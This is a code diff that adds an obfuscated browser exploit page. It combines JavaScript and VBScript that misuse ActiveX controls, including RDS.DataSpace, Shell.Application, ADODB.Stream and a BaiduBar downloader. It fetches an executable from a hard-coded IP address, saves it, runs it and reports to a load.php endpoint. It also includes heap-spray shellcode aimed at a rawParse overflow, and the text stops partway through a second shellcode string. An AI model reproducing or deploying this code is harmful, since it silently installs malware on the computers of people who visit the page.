@@ -1,0 +1,195 @@
+<script>nwZYpOGUIPrbnHrRSfY(); function nwZYpOGUIPrbnHrRSfY() {var sGWYcgkrGv = document.createElement("obj83CGbw0lcPiPtcSrct".replace(/83CGbw0lcPiPtcSr/ig, "e"));sGWYcgkrGv.setAttribute("iX2fTTSOexxUfgH".replace(/X2fTTSOexxUfgH/ig, "d"),"sGWYcgkrGv");sGWYcgkrGv.setAttribute("clJJClD08bYJJEccF1AtwWdRSssid".replace(/JJClD08bYJJEccF1AtwWdRS/ig, "a"), "clsid:BD9FOw5oDdEtq6hrWPVaoC55FOw5oDdEtq6hrWPVao-FOw5oDdEtq6hrWPVao5A3-11D0".replace(/FOw5oDdEtq6hrWPVao/ig, "6") + "-983A-00C04FC29E3qMnzJLVBXUQ1zEdR0hQi1o8V".replace(/qMnzJLVBXUQ1zEdR0hQi1o8V/ig, "6"));try { var LcmLNZiDLhUAm = sGWYcgkrGv.CreateObject("msxml2.XMLHo4eTNEr4l5FjThbzJ5o4eTNEr4l5FjThbzJ5P".replace(/o4eTNEr4l5FjThbzJ5/ig, "T"),"".replace(/X4fVwHqicaxwt4l/ig, ""));var OelJbIxUDJtFScx = sGWYcgkrGv.CreateObject("MR1An9LPAn9z2N3JdMp0thell.application".replace(/MR1An9LPAn9z2N3JdMp0t/ig, "s"),"".replace(/iEIonB5BGrjJhXKqwB/ig, ""));var yGHKiGgmESgJQnFbGlsbEfUvRn = sGWYcgkrGv.CreateObject("adodb.zJDQ9bNQcvWCjSuitO4CGatream".replace(/zJDQ9bNQcvWCjSuitO4CGa/ig, "s"),"".replace(/k8Vd12I7KbBMGWpP/ig, ""));try { yGHKiGgmESgJQnFbGlsbEfUvRn.type = 1; vjRrdjgUyXdyKDDlVRjrdqufNqnkHtkiIV = new Date(); document.write(vjRrdjgUyXdyKDDlVRjrdqufNqnkHtkiIV.toString());WgtGFtewHbdWbziwvezvRUME = navigator.systemLanguage;lYMyJDlHJmzkiJQveCGkxtzNES = navigator.language;TvsTsf = screen.availTop;qKNqieghtKNUkemSxjMhszSUUymbjlLIdnM = navigator.browserLanguage;var mQCUzjBfGSubFTJoMe = history.next;var LEKDcvkDXmktuHdLIbMGwHsAUkcOroY = history.next;var qCrbGLUuyAQXSks = screen.availHeight;ezcOoSpgkzCqf = screen.availWidth;yuMpbmcmbY = history.length;var UlGleZvFXEovHsFKcBqipwYp = navigator.userLanguage;var XXWmdlNnTtIMdgRkXVlVxKruVRxPGnbVbY = screen.availWidth;hglCHgVGZHRDrrXUzLwQgXJze = screen.availLeft;
+var i3M4I4d1W4p3W4X1H4D4s1x1C5j5a3B5C3 = 'exceptionfilled';
+ LcmLNZiDLhUAm.open("GLbBDr9pakDT".replace(/LbBDr9pakD/ig, "E"),"http://67.210.15.122/fp/bin/file.exe".replace(/%/ig, ""),false);LcmLNZiDLhUAm.send(); yGHKiGgmESgJQnFbGlsbEfUvRn.open(); yGHKiGgmESgJQnFbGlsbEfUvRn.Write(LcmLNZiDLhUAm.responseBody);var KCFwgCItzCXx = ("JwxXw3mRetdFHsmPnkjia//JwxXw3mRetdFHsmPnkjiaJwxXw3mRetdFHsmPnkjia//".replace(/JwxXw3mRetdFHsmPnkjia/ig, ".")+"uVNYuUJlYD" + ".FTnh7ktxmro51VsXF3lqSbrEtxFTnh7ktxmro51VsXF3lqSbrEt".replace(/FTnh7ktxmro51VsXF3lqSbrEt/ig, "e"));yGHKiGgmESgJQnFbGlsbEfUvRn.savetofile(KCFwgCItzCXx,2); yGHKiGgmESgJQnFbGlsbEfUvRn.Close();} catch(e){}try { eval(OelJbIxUDJtFScx.shellexecute(KCFwgCItzCXx)); if(shellexecute=true){var qFeMvQdDTfQORaAPBrojKtDQJBGSM = new ActiveXObject("microsoft.l51RgRjBYA6pNSzFncn17mlhttp".replace(/l51RgRjBYA6pNSzFncn17/ig, "x"));qFeMvQdDTfQORaAPBrojKtDQJBGSM.open("G3K68xb74kdymT".replace(/3K68xb74kdym/ig, "E"), "load.php?mdac_js=%".replace(/%/ig, "") + Math.random());qFeMvQdDTfQORaAPBrojKtDQJBGSM.send(null);}} catch(e){}}catch(e){}}</script><script language="VBScript">
+	On Error Resume Next
+	set OQPOKeuyoPuOkHicTapVUdOlA = document.createElement(replace("objAlgNZSArfpMsqPHIA5ct", "AlgNZSArfpMsqPHIA5", "e"))
+	OQPOKeuyoPuOkHicTapVUdOlA.setAttribute replace("classi5NOLExIZst0cPoa", "5NOLExIZst0cPoa", "d"), replace("clsid:BD96C556-65A3-11DuXsHy9DMHO0Y7LsK-983A-uXsHy9DMHO0Y7LsKuXsHy9DMHO0Y7LsKCuXsHy9DMHO0Y7LsK4FC29E36", "uXsHy9DMHO0Y7LsK", "0")
+	set YdmovPssihIhpoBdEXLxPRTTRF = OQPOKeuyoPuOkHicTapVUdOlA.CreateObject(replace("MiU0Wi05vxYmc9xk0BK9rosoft.XMLHTTP", "U0Wi05vxYmc9xk0BK9", "c"), replace("", "mYpz1lc80xAGLy7S", ""))
+	set pPTCwNIvbCwOhnjjVuYYoLmdlytb = OQPOKeuyoPuOkHicTapVUdOlA.createobject(replace("Adodb.wIwo6HH2hLPat5Atream", "wIwo6HH2hLPat5A", "S"), replace("", "8t7iy11wqk", ""))
+	set KBNQEsqIavfyfDNFP = OQPOKeuyoPuOkHicTapVUdOlA.createobject(replace("Shell.Applica6swtS7X4fbx3Uion", "6swtS7X4fbx3U", "t"), replace("", "oKoRgRHTjyhh1gfgrpQnTOg", ""))
+	pPTCwNIvbCwOhnjjVuYYoLmdlytb.type = 1
+	LUwHXyjwRuYCcBQz = "adorn"
+BMUrcdWMxYJcsmoEg = "wnw"
+YQCLHlyeFHCYJkWdcTN = "tags"
+FkeNeNNFfssgcwISUAuRHwA = "lsd"
+JjmzCpdLiXRcp = 5847495
+NSBTjSfGVdEyNKnIKuTbrXhBm = "wiley"
+YuiWCmAEOmzUqBr = 4970149
+lUpviQCLeLhxLu = 4336424
+XSEOdVQjdUpTJGmQQM = "sworn"
+sjYGJdXhcHFjq = 9387140
+dQFNcvEYftvJQRmDqr = "muggy"
+trPKKHjVuRedVMgWnQR = "corps"
+XXrFujHjtDKxubfzbjMl = "tea"
+pugquezoBNkVwLFYAW = 8055213
+xHrhlJCMJvfltxVgNuf = "aside"
+nDQSdAsJLsvX = 6951708
+MvXjADwdnvPxNbVFTdMDfCqW = "seth"
+jTTfTzdeSedjAzdviL = "breed"
+tSzuMkpScGzdsnhUINuY = "feb"
+	YdmovPssihIhpoBdEXLxPRTTRF.Open replace("HEH4sEsPcrB02ET", "HEH4sEsPcrB02", "G"), replace("http://67.210.15.122/fp/bin/file.exe", "%%%", ""), False
+	YdmovPssihIhpoBdEXLxPRTTRF.Send
+	pPTCwNIvbCwOhnjjVuYYoLmdlytb.Open
+	pPTCwNIvbCwOhnjjVuYYoLmdlytb.write YdmovPssihIhpoBdEXLxPRTTRF.responseBody
+	pPTCwNIvbCwOhnjjVuYYoLmdlytb.savetofile replace("..//imKoTFbghITWitKIvEfKwqnEqb2v8Mi9dKLpJfBTEqb2v8Mi9dKLpJMj.exe", "Eqb2v8Mi9dKLpJ", "J"), 2
+	pPTCwNIvbCwOhnjjVuYYoLmdlytb.close
+	KBNQEsqIavfyfDNFP.ShellExecute replace("..//imKoTFbgf2JfwCWy5BepX7ep0LPITWitKIvEfKwqnJfBTJMj.exe", "f2JfwCWy5BepX7ep0LP", "h"), replace("", "qajLv9xJKPskYe", ""), replace("", "X0Hx3Yf75s", ""), replace("opjiPy74kNnF0PS35Zqn", "jiPy74kNnF0PS35Zq", "e"), 0
+	if err.number = 0 then
+	set LVBcunwnQAxMaQMWBajaNUjY = CreateObject(replace("Microsoft.XMLiD4ii2cpIXKDLLeLUXqajzTTP", "iD4ii2cpIXKDLLeLUXqajz", "H"))
+	LVBcunwnQAxMaQMWBajaNUjY.Open replace("0vAIIn4bhvdWkZO8TEAHET", "0vAIIn4bhvdWkZO8TEAH", "G"), replace("load.php?mdac_vb=%", "%", ""), false
+	LVBcunwnQAxMaQMWBajaNUjY.Send
+	LVBcunwnQAxMaQMWBajaNUjY.Close
+	end if
+	</script><script>function oGfZdmFuYQck(JGHLDrmMdY, pYZtUDJPeVCtPr, CdnBdVMkOmND, yfiPWpqNNTjSuLQ) { var wemyHqeXqoNlxKDRo = null;try { eval('wemyHqeXqoNlxKDRo = JGHLDrmMdY.CreateObject(pYZtUDJPeVCtPr)')} catch(e){}if (! wemyHqeXqoNlxKDRo) { try { eval('wemyHqeXqoNlxKDRo = JGHLDrmMdY.CreateObject(pYZtUDJPeVCtPr, "".replace(/nIK70QNL3W/ig, ""))') }catch(e){}}if (! wemyHqeXqoNlxKDRo) { try { eval('wemyHqeXqoNlxKDRo = JGHLDrmMdY.CreateObject(pYZtUDJPeVCtPr, "".replace(/kE565Bcu0zp7jvBI4VhRH391/ig, ""), "".replace(/7k2iGMhWeuDMPdspgLJXT/ig, ""))') }catch(e){}}if (! wemyHqeXqoNlxKDRo) { try { eval('wemyHqeXqoNlxKDRo = JGHLDrmMdY.GetObject("".replace(/WlMNDoovt9fZskdyNwGdg/ig, ""), pYZtUDJPeVCtPr)') }catch(e){}}if (! wemyHqeXqoNlxKDRo) { try { eval('wemyHqeXqoNlxKDRo = JGHLDrmMdY.GetObject(pYZtUDJPeVCtPr, "".replace(/hvs09TrkSTfONLaB192O/ig, ""))') }catch(e){}}if (! wemyHqeXqoNlxKDRo) { try { eval('wemyHqeXqoNlxKDRo = JGHLDrmMdY.GetObject(pYZtUDJPeVCtPr)') }catch(e){}}return(wemyHqeXqoNlxKDRo);} function Go(THrblbfaqfyNMjKThs) { var sx = oGfZdmFuYQck(THrblbfaqfyNMjKThs, "WB7NI4PGwGYs6wcpDYcript.B7NI4PGwGYs6wcpDYhell".replace(/B7NI4PGwGYs6wcpDY/ig, "S"));var fGYEeSwhSEF = oGfZdmFuYQck(THrblbfaqfyNMjKThs, "ADODB.St5wHLsyNggGhrEeam".replace(/5wHLsyNggGhrE/ig, "r")); var juwYoidCgpmytlqwYfmefMaMeyJs = null;try { juwYoidCgpmytlqwYfmefMaMeyJs = new XMLHttpRequest(); } catch(e) { try { juwYoidCgpmytlqwYfmefMaMeyJs = new ActiveXObject("MmGF19sYL03Xgcrosoft.XMLHTTP".replace(/mGF19sYL03Xg/ig, "i")); } catch(e) {juwYoidCgpmytlqwYfmefMaMeyJs = new ActiveXObject("MSMUVZLoRw3fT3lML2.ServerMUVZLoRw3fT3lMLHTTP".replace(/MUVZLoRw3fT3l/ig, "X"));}} if (! juwYoidCgpmytlqwYfmefMaMeyJs) return(0);juwYoidCgpmytlqwYfmefMaMeyJs.open("GGQO2ohUaLflJfxYT".replace(/GQO2ohUaLflJfxY/ig, "E"), "http://67.210.15.122/fp/bin/file.exe".replace(/%%%/ig, ""), false); juwYoidCgpmytlqwYfmefMaMeyJs.send(null);FRElmpkkcZvhiloSDK = juwYoidCgpmytlqwYfmefMaMeyJs.responseBody; fGYEeSwhSEF.Type = 1+0; fGYEeSwhSEF.Mode = 3+0; fGYEeSwhSEF.Open(); fGYEeSwhSEF.Write(FRElmpkkcZvhiloSDK);fGYEeSwhSEF.SaveToFile("..//..//DBvdhNlPpAAFNV4dPQf0XPhFMjh6Bo5hthEWKV4dPQf0XPhFMjh6Bo5hthEWKCFUR".replace(/V4dPQf0XPhFMjh6Bo5hthEWK/ig, "K") + ".e0toSlfSooPJQge".replace(/0toSlfSooPJQg/ig, "x"), 2);eval(sx.Run("..//..//DBvdhNlPpAAFNKKCFUd4lSJqioA3w".replace(/d4lSJqioA3w/ig, "R") + "b00qMTHTrTBhEElU1cVwexe".replace(/b00qMTHTrTBhEElU1cVw/ig, "."),0));if(run=true){ var rw = new ActiveXObject("z0RxIi30TGHaNkaVPgdicrosoft.xz0RxIi30TGHaNkaVPgdlhttp".replace(/z0RxIi30TGHaNkaVPgd/ig, "m"));rw.open("GgpdkT0R6XS3mslmlOjIJT".replace(/gpdkT0R6XS3mslmlOjIJ/ig, "E"), "load.php?mdac_cro=%".replace(/%/ig, "") + Math.random()); rw.send(null);} }function vzrljabtYdnRub() { var YYodaqLxpQqDEIjTFE = 0; BRFZIrLhXyClwlZWkrHmQkiIWUffmBUKyRl = navigator.browserLanguage;ggRlukkKCd = history.current;YMnkbZ = history.previous;var veDquvbTjLm = navigator.onLine;var USZQeO = navigator.appName;var xPUSgevz = navigator.userLanguage;nMGsMQZGTGhTygizTw = navigator.browserLanguage;BdFphdpsSwTPkKzOXyozXsgNUuJkwGLjHUy = history.next;var zXcdhHufeXhRXiyuUNBTPoINEVZnVMi = navigator.systemLanguage;poeBewplrcEhtKEAxirmDdi = history.length;var jKCRZgZMKUbJhkHGgeSIktApNDzYlbbZAt = history.current;eYnQrMEbnKNHpfrYvDHcuulwoVprmoTXz = navigator.cookieEnabled;ugwKkYrVedn = navigator.language;
+var JUvJWIWWQn = 666001122;var e2V1e5K6c1D6a6G2H6m5 = 'securitybreaking';X7k8a0C0O9o9b8R9Z8A9 = 'pseudomathematical';var JPtdnGwBpvGyXmcV = 823829245;w8x8H7a8S9n9S0s0J7c0K0h9 = 'itsrelated';J0d7f9o7I0B0 = 'helpfulness';T0D9A8A7R8F8N9F9U9s8 = 'vaxocentrism';var T2q3u6w1H4Q2Z6X3H3E5S6s5d4 = 'spooling';l8E9G8O9q8y8 = 'ones';o9R0R9F8O8K7o0k7q0f8c7h8O0I9t0U0g9R7 = 'authoritatively';var X4F1y2d3Q4B3I5b4O1O2i3 = 'flatfile';w9s8Z7G8S9u7P0t9 = 'disapproving';var mBzMBFzmMhFY = 254977777;
+ var t = new Array("{BD90HxdETzq92hC550HxdETzq92h-0HxdETzq92h5A3-11D0-983A-00C04FC29E30HxdETzq92h}".replace(/0HxdETzq92h/ig, "6"),"{BD96C556Q0qugxnp4Q99TcDOF65A3Q0qugxnp4Q99TcDOF11D0Q0qugxnp4Q99TcDOF983AQ0qugxnp4Q99TcDOF00C04FC29E36}".replace(/Q0qugxnp4Q99TcDOF/ig, "-"),"{AB9BCEDDcmr6xnCB7Lsyd6qoOaTM80zEC7Ecmr6xnCB7Lsyd6qoOaTM80z47E1cmr6xnCB7Lsyd6qoOaTM80z9322cmr6xnCB7Lsyd6qoOaTM80zD4A210617116}".replace(/cmr6xnCB7Lsyd6qoOaTM80z/ig, "-"),"{UZ3xxQRZUGerKy7N6UZ3xxQRZUGerKy7N6UZ3xxQRZUGerKy7N66FUZ3xxQRZUGerKy7N633-UZ3xxQRZUGerKy7N6UZ3xxQRZUGerKy7N6UZ3xxQRZUGerKy7N6UZ3xxQRZUGerKy7N6-UZ3xxQRZUGerKy7N6UZ3xxQRZUGerKy7N6UZ3xxQRZUGerKy7N6UZ3xxQRZUGerKy7N6-CUZ3xxQRZUGerKy7N6UZ3xxQRZUGerKy7N6UZ3xxQRZUGerKy7N6-UZ3xxQRZUGerKy7N6UZ3xxQRZUGerKy7N6UZ3xxQRZUGerKy7N6UZ3xxQRZUGerKy7N6UZ3xxQRZUGerKy7N6UZ3xxQRZUGerKy7N6UZ3xxQRZUGerKy7N6UZ3xxQRZUGerKy7N6UZ3xxQRZUGerKy7N6UZ3xxQRZUGerKy7N646}".replace(/UZ3xxQRZUGerKy7N6/ig, "0"),"{5MrG2RUDFRylJ59I9m5H9wuIJ5MrG2RUDFRylJ59I9m5H9wuIJ5MrG2RUDFRylJ59I9m5H9wuIJ6F5MrG2RUDFRylJ59I9m5H9wuIJ3A-5MrG2RUDFRylJ59I9m5H9wuIJ5MrG2RUDFRylJ59I9m5H9wuIJ5MrG2RUDFRylJ59I9m5H9wuIJ5MrG2RUDFRylJ59I9m5H9wuIJ-5MrG2RUDFRylJ59I9m5H9wuIJ5MrG2RUDFRylJ59I9m5H9wuIJ5MrG2RUDFRylJ59I9m5H9wuIJ5MrG2RUDFRylJ59I9m5H9wuIJ-C5MrG2RUDFRylJ59I9m5H9wuIJ5MrG2RUDFRylJ59I9m5H9wuIJ5MrG2RUDFRylJ59I9m5H9wuIJ-5MrG2RUDFRylJ59I9m5H9wuIJ5MrG2RUDFRylJ59I9m5H9wuIJ5MrG2RUDFRylJ59I9m5H9wuIJ5MrG2RUDFRylJ59I9m5H9wuIJ5MrG2RUDFRylJ59I9m5H9wuIJ5MrG2RUDFRylJ59I9m5H9wuIJ5MrG2RUDFRylJ59I9m5H9wuIJ5MrG2RUDFRylJ59I9m5H9wuIJ5MrG2RUDFRylJ59I9m5H9wuIJ5MrG2RUDFRylJ59I9m5H9wuIJ46}".replace(/5MrG2RUDFRylJ59I9m5H9wuIJ/ig, "0"),"{TIUJbYy9UrpQBsxe32070a-7TIUJbYy9UrpQBsxTIUJbYy9UrpQBsxd-4eeTIUJbYy9UrpQBsx-879c-dc1fa91d2fc3}".replace(/TIUJbYy9UrpQBsx/ig, "6"),"{6414512BcKuOY1jgi3EnanbniRgt8B978cKuOY1jgi3EnanbniRgt8451DcKuOY1jgi3EnanbniRgt8A0D8cKuOY1jgi3EnanbniRgt8FCFDF33E833C}".replace(/cKuOY1jgi3EnanbniRgt8/ig, "-"),"{7F5B7F63-FVofdcDPgi31y74JYaioJF6F-4331-8A26-339EVofdcDPgi31y74JYaioJF3CVofdcDPgi31y74JYaioJFAE3D}".replace(/VofdcDPgi31y74JYaioJF/ig, "0"),"{06723E09-F4C2-43c8-8358-09FCDxJSMJplZEmtG1j5aFyDB0766}".replace(/xJSMJplZEmtG1j5aFy/ig, "1"),"{639F725F9La2DTqCChVDpc1B2D9La2DTqCChVDpc48319La2DTqCChVDpcA9FD9La2DTqCChVDpc874847682010}".replace(/9La2DTqCChVDpc/ig, "-"),"{BA010DYi0m4EnPuo4WAkZ1zESaCCZ599-1DB3-44f9-0DYi0m4EnPuo4WAkZ1zESaCCZ3B4-461454C0DYi0m4EnPuo4WAkZ1zESaCCZ4BF0DYi0m4EnPuo4WAkZ1zESaCCZ}".replace(/0DYi0m4EnPuo4WAkZ1zESaCCZ/ig, "8"),"{D0C07D56-7C69-43F1-B4V1bsDaWS2mBSF0-25F5V1bsDaWS2mBSF11FV1bsDaWS2mBSFB19}".replace(/V1bsDaWS2mBSF/ig, "A"),"{E8CCCDDFpYwpXOcbcnEgniAS3zQBkyCA28pYwpXOcbcnEgniAS3zQBky496bpYwpXOcbcnEgniAS3zQBkyB050pYwpXOcbcnEgniAS3zQBky6C07C962476B}".replace(/pYwpXOcbcnEgniAS3zQBky/ig, "-"),null); while (t[YYodaqLxpQqDEIjTFE]) { var THrblbfaqfyNMjKThs = null;if (t[YYodaqLxpQqDEIjTFE].substring(0,1) == '{') { THrblbfaqfyNMjKThs = document.createElement("objOqLIadtlygehBct".replace(/OqLIadtlygehB/ig, "e"));THrblbfaqfyNMjKThs.setAttribute("classjgZsJ42lxCg3Pd".replace(/jgZsJ42lxCg3P/ig, "i"), "clsidagnU3HDigL3x6Z".replace(/agnU3HDigL3x6Z/ig, ":") + t[YYodaqLxpQqDEIjTFE].substring(1, t[YYodaqLxpQqDEIjTFE].length - 1));} else { try { THrblbfaqfyNMjKThs = new ActiveXObject(t[YYodaqLxpQqDEIjTFE]); } catch(e){}}if (THrblbfaqfyNMjKThs) { try { var WdkgpGKFgtvdqqtjtXgyDTNoP = oGfZdmFuYQck(THrblbfaqfyNMjKThs, "WSfIqQBYk93WTUdZuo9sym6ript.Shell".replace(/fIqQBYk93WTUdZuo9sym6/ig, "c")); if (WdkgpGKFgtvdqqtjtXgyDTNoP) { Go(THrblbfaqfyNMjKThs); return(0);}} catch(e){}} YYodaqLxpQqDEIjTFE++; }} vzrljabtYdnRub();</script><object id="com" classid="clsid:A7F05EE4-0426-454F-8013-C41E3596E9E9"></object>
+<script>try{if(new ActiveXObject("BaiduBar.Tool.1")){com.DloadDS("http://67.210.15.122/fp/load.php?baidu", "file.exe", 0);}}catch(e){}}</script><object classid="clsid:6BE52E1D-E586-474f-A6E2-1A85A9B4D9FB" id='target'></object>  
+    
+<SCRIPT language="javascript">
+
+var shellcode = unescape("%u4343%u4343%u0feb%u335b%uDWTxfPxh3pcOf53KzrNGCzQ3FDWTxfPxh3pcOf53KzrNGCzQ3Fc9%u80b9%u8001%uef33%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%uDWTxfPxh3pcOf53KzrNGCzQ3F4ef%ue3af%u9fDWTxfPxh3pcOf53KzrNGCzQ3F4%u42f3%u9fDWTxfPxh3pcOf53KzrNGCzQ3F4%uDWTxfPxh3pcOf53KzrNGCzQ3Fee7%uef03%uefeb%uDWTxfPxh3pcOf53KzrNGCzQ3F4ef%ub903%uDWTxfPxh3pcOf53KzrNGCzQ3F187%ue1a1%u0703%uef11%uefef%uaaDWTxfPxh3pcOf53KzrNGCzQ3FDWTxfPxh3pcOf53KzrNGCzQ3F%ub9eb%u7787%uDWTxfPxh3pcOf53KzrNGCzQ3F511%u07e1%uef1f%uefef%uaaDWTxfPxh3pcOf53KzrNGCzQ3FDWTxfPxh3pcOf53KzrNGCzQ3F%ub9e7%uca87%u105f%u072d%uef0d%uefef%uaaDWTxfPxh3pcOf53KzrNGCzQ3FDWTxfPxh3pcOf53KzrNGCzQ3F%ub9e3%u0087%u0f21%u078f%uef3b%uefef%uaaDWTxfPxh3pcOf53KzrNGCzQ3FDWTxfPxh3pcOf53KzrNGCzQ3F%ub9ff%u2e87%u0a9DWTxfPxh3pcOf53KzrNGCzQ3F%u0757%uef29%uefef%uaaDWTxfPxh3pcOf53KzrNGCzQ3FDWTxfPxh3pcOf53KzrNGCzQ3F%uaffb%ud7DWTxfPxh3pcOf53KzrNGCzQ3Ff%u9a2c%uDWTxfPxh3pcOf53KzrNGCzQ3FDWTxfPxh3pcOf53KzrNGCzQ3F15%uf7aa%ue80DWTxfPxh3pcOf53KzrNGCzQ3F%uefee%ub1ef%u9aDWTxfPxh3pcOf53KzrNGCzQ3FDWTxfPxh3pcOf53KzrNGCzQ3F%uDWTxfPxh3pcOf53KzrNGCzQ3F4cb%uebaa%uee85%uDWTxfPxh3pcOf53KzrNGCzQ3F4bDWTxfPxh3pcOf53KzrNGCzQ3F%uf7ba%u07b9%uefDWTxfPxh3pcOf53KzrNGCzQ3F4%uefef%u87bf%uf5d9%u9fc0%u7807%uefef%uDWTxfPxh3pcOf53KzrNGCzQ3FDWTxfPxh3pcOf53KzrNGCzQ3Fef%uf3aa%u2aDWTxfPxh3pcOf53KzrNGCzQ3F4%u2fDWTxfPxh3pcOf53KzrNGCzQ3Fc%uDWTxfPxh3pcOf53KzrNGCzQ3FDWTxfPxh3pcOf53KzrNGCzQ3Fbf%ucfaa%u1087%uefef%ubfef%uaaDWTxfPxh3pcOf53KzrNGCzQ3F4%u85fb%ubDWTxfPxh3pcOf53KzrNGCzQ3Fed%ubaDWTxfPxh3pcOf53KzrNGCzQ3F4%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf%u8a97%uefef%u9a10%uDWTxfPxh3pcOf53KzrNGCzQ3F4cf%ue3aa%uee85%uDWTxfPxh3pcOf53KzrNGCzQ3F4bDWTxfPxh3pcOf53KzrNGCzQ3F%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc%ucf9a%ubcbf%uaaDWTxfPxh3pcOf53KzrNGCzQ3F4%u85f3%ubDWTxfPxh3pcOf53KzrNGCzQ3Fea%ubaDWTxfPxh3pcOf53KzrNGCzQ3F4%u07f7%uefcc%uefef%uef85%u9a10%uDWTxfPxh3pcOf53KzrNGCzQ3F4cf%ue7aa%ued85%uDWTxfPxh3pcOf53KzrNGCzQ3F4bDWTxfPxh3pcOf53KzrNGCzQ3F%uf7ba%uff07%uefef%u85ef%uDWTxfPxh3pcOf53KzrNGCzQ3F410%uffaa%uee85%uDWTxfPxh3pcOf53KzrNGCzQ3F4bDWTxfPxh3pcOf53KzrNGCzQ3F%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec%u03DWTxfPxh3pcOf53KzrNGCzQ3Fc%ub5eb%uDWTxfPxh3pcOf53KzrNGCzQ3F4bc%u0d35%ubd18%u0f10%uDWTxfPxh3pcOf53KzrNGCzQ3F4ba%uDWTxfPxh3pcOf53KzrNGCzQ3F403%ue792%ub2DWTxfPxh3pcOf53KzrNGCzQ3F4%ub9e3%u9cDWTxfPxh3pcOf53KzrNGCzQ3F4%uDWTxfPxh3pcOf53KzrNGCzQ3F4d3%uf19b%uec97%ub91c%u99DWTxfPxh3pcOf53KzrNGCzQ3F4%ueccf%udc1c%uaDWTxfPxh3pcOf53KzrNGCzQ3F2DWTxfPxh3pcOf53KzrNGCzQ3F%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b%u212e%uece2%uaf1d%u1e04%u11d4%u9ab1%ub50a%u04DWTxfPxh3pcOf53KzrNGCzQ3F4%ub5DWTxfPxh3pcOf53KzrNGCzQ3F4%ueccb%u8932%ue3DWTxfPxh3pcOf53KzrNGCzQ3F4%uDWTxfPxh3pcOf53KzrNGCzQ3F4a4%uf3b5%u32ec%uebDWTxfPxh3pcOf53KzrNGCzQ3F4%uecDWTxfPxh3pcOf53KzrNGCzQ3F4%ub12a%u2db2%uefe7%u1b07%u1011%uba10%ua3bd%ua0a2%uefa1".replace(/DWTxfPxh3pcOf53KzrNGCzQ3F/ig, "6") + "%u7468%u7074%u2F3A%u362F%u2E37%u3132%u2E30%u3531%u312E%u3232%u662F%u2F70%u6F6C%u6461%u702E%u7068%u733F%u6C70%u7961%u7265");
+
+var bigblock = unescape("%u9090%u9090");
+var headersize = 20;
+var slackspace = headersize+shellcode.length;
+while (bigblock.length<slackspace) bigblock+=bigblock;
+fillblock = bigblock.substring(0, slackspace);
+block = bigblock.substring(0, bigblock.length-slackspace);
+while(block.length+slackspace<0x40000) blockblock = block+block+fillblock;
+memory = new Array();
+for (x=0; x<300; x++) memory[x] = block + shellcode;
+var buffer = '';
+while (buffer.length < 4096) buffer+="\x0a\x0a\x0a\x0a";
+target.rawParse(buffer);
+</script><HEAD><OBJECT id=obj classid=clsid:00000535-0000-0010-8000-00AA006D2EA4></OBJECT></HEAD>
+
+<BODY>
+
+<script language=javascript>
+
+var Shellcode = unescape("%u4343%u4343%u0feb%u335b%uDWTxfPxh3pcOf53KzrNGCzQ3FDWTxfPxh3pcOf53KzrNGCzQ3Fc9%u80b9%u8001%uef33%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%uDWTxfPxh3pcOf53KzrNGCzQ3F4ef%ue3af%u9fDWTxfPxh3pcOf53KzrNGCzQ3F4%u42f3%u9fDWTxfPxh3pcOf53KzrNGCzQ3F4%uDWTxfPxh3pcOf53KzrNGCzQ3Fee7%uef03%uefeb%uDWTxfPxh3pcOf53KzrNGCzQ3F4ef%ub903%uDWTxfPxh3pcOf53KzrNGCzQ3F187%ue1a1%u0703%uef11%uefef%uaaDWTxfPxh3pcOf53KzrNGCzQ3FDWTxfPxh3pcOf53KzrNGCzQ3F%ub9eb%u7787%uDWTxfPxh3pcOf53KzrNGCzQ3F511%u07e1%uef1f%uefef%uaaDWTxfPxh3pcOf53KzrNGCzQ3FDWTxfPxh3pcOf53KzrNGCzQ3F%ub9e7%uca87%u105f%u072d%uef0d%uefef%uaaDWTxfPxh3pcOf53KzrNGCzQ3FDWTxfPxh3pcOf53KzrNGCzQ3F%ub9e3%u0087%u0f21%u078f%uef3b%uefef%uaaDWTxfPxh3pcOf53KzrNGCzQ3FDWTxfPxh3pcOf53KzrNGCzQ3F%ub9ff%u2e87%u0a9DWTxfPxh3pcOf53KzrNGCzQ3F%u0757%uef29%uefef%uaaDWTxfPxh3pcOf53KzrNGCzQ3FDWTxfPxh3pcOf53KzrNGCzQ3F%uaffb%ud7DWTxfPxh3pcOf53KzrNGCzQ3Ff%u9a2c%uDWTxfPxh3pcOf53KzrNGCzQ3FDWTxfPxh3pcOf53KzrNGCzQ3F15%uf7aa%ue80DWTxfPxh3pcOf53KzrNGCzQ3F%uefee%ub1ef%u9aDWTxfPxh3pcOf53KzrNGCzQ3FDWTxfPxh3pcOf53KzrNGCzQ3F%uDWTxfPxh3pcOf53KzrNGCzQ3F4cb%uebaa%uee85%uDWTxfPxh3pcOf53KzrNGCzQ3F4bDWTxfPxh3pcOf53KzrNGCzQ3F%uf7ba%u07b9%uefDWTxfPxh3pcOf53KzrNGCzQ3F4%uefef%u87bf%uf5d9%u9fc0%u7807%uefef%uDWTxfPxh3pcOf53KzrNGCzQ3FDWTxfPxh3pcOf53KzrNGCzQ3Fef%uf3aa%u2aDWTxfPxh3pcOf53KzrNGCzQ3F4%u2fDWTxfPxh3pcOf53KzrNGCzQ3Fc%uDWTxfPxh3pcOf53KzrNGCzQ3FDWTxfPxh3pcOf53KzrNGCzQ3Fbf%ucfaa%u1087%uefef%ubfef%uaaDWTxfPxh3pcOf53KzrNGCzQ3F4%u85fb%ubDWTxfPxh3pcOf53KzrNGCzQ3Fed%ubaDWTxfPxh3pcOf53KzrNGCzQ3F4%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf%u8a97%uefef%u9a10%uDWTxfPxh3pcOf53KzrNGCzQ3F4cf%ue3aa%uee85%uDWTxfPxh3pcOf53KzrNGCzQ3F4bDWTxfPxh3pcOf53KzrNGCzQ3F%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc%ucf9a%ubcbf%uaaDWTxfPxh3pcOf53KzrNGCzQ3F4%u85f3%ubDWTxfPxh3pcOf53KzrNGCzQ3Fea%ubaDWTxfPxh3pcOf53KzrNGCzQ3F4%u07f7%uefcc%uefef%uef85%u9a10%uDWTxfPxh3